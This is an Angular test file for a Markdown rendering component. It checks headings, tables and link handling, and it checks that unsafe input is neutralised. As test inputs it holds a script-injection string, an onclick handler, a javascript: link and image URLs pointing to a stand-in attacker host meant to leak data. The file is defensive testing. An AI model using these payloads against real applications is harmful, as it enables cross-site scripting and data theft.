import { ComponentFixture, TestBed } from '@angular/core/testing';

import { MarkdownComponent } from './markdown.component';

describe('MarkdownComponent', () => {
  let fixture: ComponentFixture<MarkdownComponent>;

  function render(source: string): HTMLElement {
    fixture.componentRef.setInput('source', source);
    fixture.detectChanges();
    return fixture.nativeElement.querySelector('.md');
  }

  beforeEach(async () => {
    await TestBed.configureTestingModule({ imports: [MarkdownComponent] }).compileComponents();
    fixture = TestBed.createComponent(MarkdownComponent);
  });

  it('renders headings, emphasis, lists, code and tables', () => {
    const md = render(
      '# Title\n\nSome **bold** and `code`.\n\n- one\n- two\n\n```py\nprint(1)\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |',
    );

    expect(md.querySelector('h1')?.textContent).toBe('Title');
    expect(md.querySelector('strong')?.textContent).toBe('bold');
    expect(md.querySelectorAll('li').length).toBe(2);
    expect(md.querySelector('pre code')?.textContent).toContain('print(1)');
    expect(md.querySelector('table td')?.textContent).toBe('1');
  });

  it('shows raw HTML as text instead of running it', () => {
    const md = render('Hello <script>window.__pwned = true</script> <b onclick="x()">bold</b>');

    expect(md.querySelector('script')).toBeNull();
    expect(md.querySelector('b')).toBeNull();
    expect(md.textContent).toContain('<script>');
    expect((window as unknown as { __pwned?: boolean }).__pwned).toBeUndefined();
  });

  it('never loads images, since a remote image URL can leak data', () => {
    const md = render('![secret](https://evil.example/leak?d=abc) <img src="https://evil.example/x.png">');

    expect(md.querySelector('img')).toBeNull();
    expect(md.textContent).toContain('secret');
  });

  it('neutralises javascript: links', () => {
    const md = render('[click me](javascript:alert(1))');
    const href = md.querySelector('a')?.getAttribute('href') ?? '';

    expect(href.startsWith('javascript:')).toBeFalse();
  });

  it('opens normal links in a new tab without leaving the app', () => {
    const md = render('[docs](https://example.com/page)');
    const open = spyOn(window, 'open');
    const click = new MouseEvent('click', { bubbles: true, cancelable: true });

    md.querySelector('a')!.dispatchEvent(click);

    expect(click.defaultPrevented).toBeTrue();
    expect(open).toHaveBeenCalledWith('https://example.com/page', '_blank', 'noopener,noreferrer');
  });
});
